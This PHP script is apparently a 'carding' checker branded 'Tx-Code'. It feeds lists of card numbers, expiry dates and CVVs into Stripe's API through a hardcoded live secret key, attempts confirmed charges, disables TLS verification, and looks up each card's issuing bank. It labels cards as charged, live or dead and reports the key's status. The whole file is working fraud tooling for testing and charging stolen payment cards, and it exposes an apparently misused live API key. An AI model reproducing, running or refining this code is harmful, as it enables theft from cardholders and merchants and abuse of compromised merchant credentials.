<?php

//======= [ MADE BY  Tx-Code ] ====================//
#---------------[ STRIPE MERCHANTE PROXYLESS ]----------------#


error_reporting(0);
date_default_timezone_set('America/Buenos_Aires');
require "./function.php";

$skeys = array(
1 => 'sk_live_wL2A0WQo4DW78g3lSepbQZVs006M5SZvqx',
//2 =>  '',
//4 => '',
);
    $skey = array_rand($skeys);
    $sk = $skeys[$skey];
$amt = $_GET['amount'];
$amount = $amt * 100;
$lista = $_GET['lista'];

$cc = multiexplode(array(":","|",""), $lista)[0];
$mes = multiexplode(array(":","|",""), $lista)[1];
$ano = multiexplode(array(":","|",""), $lista)[2];
$cvv = multiexplode(array(":","|",""), $lista)[3];
if (strlen($mes) == 1) $mes = "0$mes";
if (strlen($ano) == 2) $ano = "20$ano";
##############################################################################################################-------------------[1st REQ]--------------------#
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&card[cvc]='.$cvv.'');
$r1 = curl_exec($ch);
$tok1 = Getstr($r1,'"id": "','"');
$msg = Getstr($r1,'"message": "','"');

#-------------------[2nd REQ]--------------------#

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_intents');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'amount='.$amount.'&currency=eur&payment_method_types[]=card&description=ACCESSORIES&payment_method='.$tok1.'&confirm=true&off_session=true');
$r2 = curl_exec($ch);
$tok2 = Getstr($r2,'"id": "','"');
$check3 = trim(strip_tags(getStr($r2, '"cvc_check": "', '"')));
$msg2 = trim(strip_tags(getStr($r2, '"message": "', '"')));
$receipturl = trim(strip_tags(getStr($r2, '"receipt_url": "', '"')));
$risklevel = trim(strip_tags(getStr($r2, '"risk_level": "', '"')));
// $charge = trim(strip_tags(getstr($r2, '"id": "', '"')));
// $seller_message = trim(strip_tags(getStr($r2, '"seller_message": "', '"')));

////////////////////////////

$cctwo = substr("$cc", 0, 6);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cctwo.'');
curl_setopt($ch, CURLOPT_USERAGENT, $user_agent);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$fim = json_decode($fim,true);
$bank = $fim['bank']['name'];
$country = $fim['country']['alpha2'];
$type = $fim['type'];

if(strpos($fim, '"type":"credit"') !== false) {
  $type = 'Credit';
} else {
  $type = 'Debit';
}


#########################################################################

if (strpos($r2, '"seller_message": "Payment complete."')){
  $status = '#CHARGED';
  $resmsg = ' 𝘾𝙝𝙖𝙧𝙜𝙚𝙙✅ Tx-Code ';
  if (ccncharge($check3) == 'pass'){
    
  }else{
    $resmsg =' 𝘾𝘾𝙉 𝘾𝙝𝙖𝙧𝙜𝙚𝙙 ';
  };
  
  echo '<p style="text-align: left;" class="uk-margin-small-top"><b> '.$status.' '. $lista . ' <br>➤ '.$resmsg.': $ '.$amt.' <a class="receipt" href="'.$receipturl.'">𝙂𝙚𝙩 𝙍𝙚𝙘𝙚𝙞𝙥𝙩</a> <br>➤ 𝙍𝙞𝙨𝙠 𝙇𝙚𝙫𝙚𝙡 : '.$risklevel.' </b> <br>➤'.$bank.'┃ ('.$country.')┃'.$type.' </p>';
  
  exit;
  }elseif ((strpos($r2,'insufficient_funds')) || (strpos($r1,'insufficient_funds'))){
  $status = '#LIVE';
  $resmsg = '𝙄𝙣𝙨𝙪𝙛𝙛𝙞𝙘𝙞𝙚𝙣𝙩';
  
  echo "<p style='text-align: left;' class='uk-margin-small-top'><b>➤ $status : $lista </br>➤ 𝙈𝙚𝙨𝙨𝙖𝙜𝙚 : $msg2 <br>➤'.$bank.'┃ ('.$country.')┃'.$type.' <br>";
  
  exit;
  }elseif (strpos($r2, "incorrect_cvc") || strpos($r1, "incorrect_cvc")) {
      $status = '#LIVE';
  $resmsg = '𝙄𝙣𝙘𝙤𝙧𝙧𝙚𝙘𝙩 𝘾𝙫𝙘';
  
  echo "<p style='text-align: left;' class='uk-margin-small-top'><b>➤ $status : $lista </br>➤ 𝙈𝙚𝙨𝙨𝙖𝙜𝙚 : $msg2 <br>➤'.$bank.'┃ ('.$country.')┃'.$type.' <br>";
  
  exit;
  }
  
  elseif (strpos($r1, 'test_mode_live_card')){
  $status = '𝙎𝙆 𝙆𝙀𝙔';
  $resmsg = '𝙩𝙚𝙨𝙩_𝙢𝙤𝙙𝙚';
  }
  
  elseif (strpos($r1, 'testmode_charges_only')){
  $status = '𝙎𝙆 𝙆𝙀𝙔';
  $resmsg = '𝙩𝙚𝙨𝙩𝙢𝙤𝙙𝙚_𝙘𝙝𝙖𝙧𝙜𝙚𝙨_𝙤𝙣𝙡𝙮';
  }
  
  elseif(strpos($r1, "invalid_request_error" )) {
  $status = '𝙎𝙆 𝙆𝙀𝙔';
  $resmsg = '𝙄𝙣𝙫𝙖𝙡𝙞𝙙 𝙍𝙚𝙦𝙪𝙚𝙨𝙩';
  }
  
  elseif(strpos($r1, "Sending credit card numbers directly to the Stripe API is generally unsafe" )) {
  $status = '𝙎𝙆 𝙆𝙀𝙔';
  $resmsg = '𝙎𝙆 𝙆𝙀𝙔 𝘿𝙀𝘼𝘿';
  }
  
  elseif(strpos($r1, "api_key_expired" )) {
  $status = '𝙎𝙆 𝙆𝙀𝙔';
  $resmsg = '𝙖𝙥𝙞_𝙠𝙚𝙮_𝙚𝙭𝙥𝙞𝙧𝙚𝙙';
  }
  
  else {
  $status = '#DIE';
  $resmsg = '𝘿𝙀𝘼𝘿';
  }

#########################[Responses Show Like]############################
echo "<p style='text-align: left;' class='uk-margin-small-top'><b>┃ $status - $resmsg - ".decline_reason($r1, $r2)."<br>┃ 𝘾𝙖𝙧𝙙 : $lista <br>┃ 𝙈𝙚𝙨𝙨𝙖𝙜𝙚 : ".decline_msg($msg, $msg2, $r1, $r2)."</b></p>";


curl_close($ch);
ob_flush();
?>
